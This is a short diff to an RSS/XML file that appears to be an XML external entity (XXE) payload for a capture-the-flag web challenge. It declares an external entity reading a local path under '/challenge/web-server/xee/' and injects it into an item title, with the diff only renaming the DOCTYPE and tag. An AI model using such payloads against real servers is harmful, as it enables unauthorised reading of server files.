@@ -1,5 +1,5 @@
 <?xml version="1.0" encoding="UTF-8" ?>
-<!DOCTYPE psswd[
+<!DOCTYPE psswd1[
   <!ENTITY psswd2 SYSTEM "file:///challenge/web-server/xee/"> 
 ]>
 <rss version="2.0">
@@ -15,7 +15,7 @@
     <description>New RSS tutorial on W3Schools</description>
   </item>
   <item>
-    <title><psswd>0x26psswd2;</psswd></title>
+    <title><psswd1>0x26psswd2;</psswd1></title>
     <link>https://www.w3schools.com/xml</link>
     <description>New XML tutorial on W3Schools</description>
   </item>
